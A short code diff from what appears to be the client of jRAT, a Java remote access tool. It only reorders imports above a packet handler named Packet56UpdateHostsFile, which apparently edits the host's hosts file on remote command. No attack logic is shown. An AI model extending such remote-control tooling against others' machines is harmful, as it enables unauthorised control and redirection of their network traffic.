@@ -2,10 +2,10 @@ package jrat.client.packets.incoming;
 
 import jrat.client.Connection;
 import jrat.client.packets.outgoing.Packet39HostEditResult;
+import oslib.OperatingSystem;
+
 import java.io.File;
 import java.io.FileWriter;
-
-import oslib.OperatingSystem;
 
 public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 
